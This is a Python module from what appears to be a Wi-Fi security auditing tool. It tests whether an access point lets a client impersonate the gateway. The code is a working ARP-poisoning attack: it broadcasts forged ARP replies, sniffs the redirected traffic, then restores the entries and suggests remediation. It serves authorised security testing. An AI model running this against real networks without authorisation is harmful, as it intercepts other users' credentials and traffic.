"""Backend device impersonation test.

Tests whether an attacker can spoof the MAC of backend infrastructure
(gateway, DHCP server, DNS server) to intercept uplink traffic from other
clients. If the AP trusts these MACs, it may forward client traffic to the
attacker instead of the real backend device.
"""

from __future__ import annotations

from scapy.all import ARP, Ether

from airsnitch.attacks.base import BaseAttackTest
from airsnitch.core.packets import PacketEngine
from airsnitch.core.types import ClientInfo, Finding, NetworkContext, Severity
from airsnitch.safeguards.audit import AuditLogger


class UplinkImpersonationTest(BaseAttackTest):
    name = "uplink_impersonation"
    description = "Backend device MAC impersonation"

    def __init__(self, ctx: NetworkContext, engine: PacketEngine, audit: AuditLogger):
        super().__init__(ctx, engine, audit)
        self._poisoned_entries: list[tuple[str, str]] = []  # (mac, ip) pairs for cleanup

    def preflight_check(self) -> tuple[bool, str]:
        if not self._ctx.gateway_mac:
            return False, "Gateway MAC not discovered"
        if not self._ctx.gateway_ip:
            return False, "Gateway IP not discovered"
        return True, "Ready"

    def execute(self, target: ClientInfo) -> Finding:
        self._audit.log_test_start(self.name, target.mac)

        backend_targets = self._discover_backend_devices()

        if not backend_targets:
            return Finding(
                test_name=self.name,
                severity=Severity.INFO,
                confidence=0.0,
                description="No backend devices discovered to impersonate",
                evidence="Could not identify infrastructure MACs",
                remediation="N/A",
            )

        our_mac = self._our_mac
        captured_total = 0
        impersonated_devices: list[str] = []

        for device_mac, device_ip, device_role in backend_targets:
            # Gratuitous ARP: claim device_ip belongs to OUR MAC (the attacker)
            # so traffic destined for the device gets sent to us
            arp_announce = (
                Ether(dst="ff:ff:ff:ff:ff:ff")
                / ARP(
                    op=2,  # ARP reply
                    psrc=device_ip,
                    hwsrc=our_mac,  # Attacker's MAC claims to be the device
                    pdst=device_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                )
            )

            self._engine.send_l2(arp_announce, count=3)
            self._poisoned_entries.append((device_mac, device_ip))

            # Sniff for redirected traffic (addressed to our MAC now)
            responses = self._engine.sniff_filtered(
                bpf_filter=f"dst host {device_ip} and ether dst {our_mac}",
                count=5,
                timeout=8,
            )

            if responses:
                captured_total += len(responses)
                impersonated_devices.append(f"{device_role}({device_ip})")

        if impersonated_devices:
            finding = Finding(
                test_name=self.name,
                severity=Severity.CRITICAL,
                confidence=0.85,
                description=(
                    f"Uplink traffic intercepted by impersonating: "
                    f"{', '.join(impersonated_devices)}. "
                    f"Attacker can capture credentials, DNS queries, and other sensitive traffic."
                ),
                evidence=f"Captured {captured_total} redirected frames",
                remediation=(
                    "Enable Dynamic ARP Inspection (DAI). "
                    "Configure DHCP snooping. "
                    "Use 802.1X with per-client VLANs. "
                    "Pin infrastructure MACs in AP configuration."
                ),
            )
            self._audit.log_test_result(self.name, target.mac, {"success": True, "devices": impersonated_devices})
        else:
            finding = Finding(
                test_name=self.name,
                severity=Severity.LOW,
                confidence=0.5,
                description="Backend impersonation did not redirect traffic",
                evidence="No redirected frames captured after ARP announcements",
                remediation="AP may have ARP protection; verify DAI configuration",
            )
            self._audit.log_test_result(self.name, target.mac, {"success": False})

        return finding

    def _discover_backend_devices(self) -> list[tuple[str, str, str]]:
        """Discover backend infrastructure devices.

        Returns list of (mac, ip, role). Deduplicates by IP to avoid
        redundant ARP poisoning of the same target.
        """
        devices: list[tuple[str, str, str]] = []
        seen_ips: set[str] = set()

        if self._ctx.gateway_mac and self._ctx.gateway_ip:
            devices.append((self._ctx.gateway_mac, self._ctx.gateway_ip, "gateway"))
            seen_ips.add(self._ctx.gateway_ip)

        # TODO: Discover actual DNS/DHCP servers via resolv.conf or DHCP lease
        # parsing. For now, only the gateway is targeted to avoid duplicate
        # ARP poisoning of the same IP.

        return devices

    def cleanup(self) -> None:
        """Send corrective ARP for ALL poisoned entries."""
        for original_mac, device_ip in self._poisoned_entries:
            try:
                restore = (
                    Ether(dst="ff:ff:ff:ff:ff:ff")
                    / ARP(
                        op=2,
                        psrc=device_ip,
                        hwsrc=original_mac,
                        pdst=device_ip,
                        hwdst="ff:ff:ff:ff:ff:ff",
                    )
                )
                self._engine.send_l2(restore, count=5)
            except Exception:
                pass  # Best-effort cleanup
        self._poisoned_entries.clear()
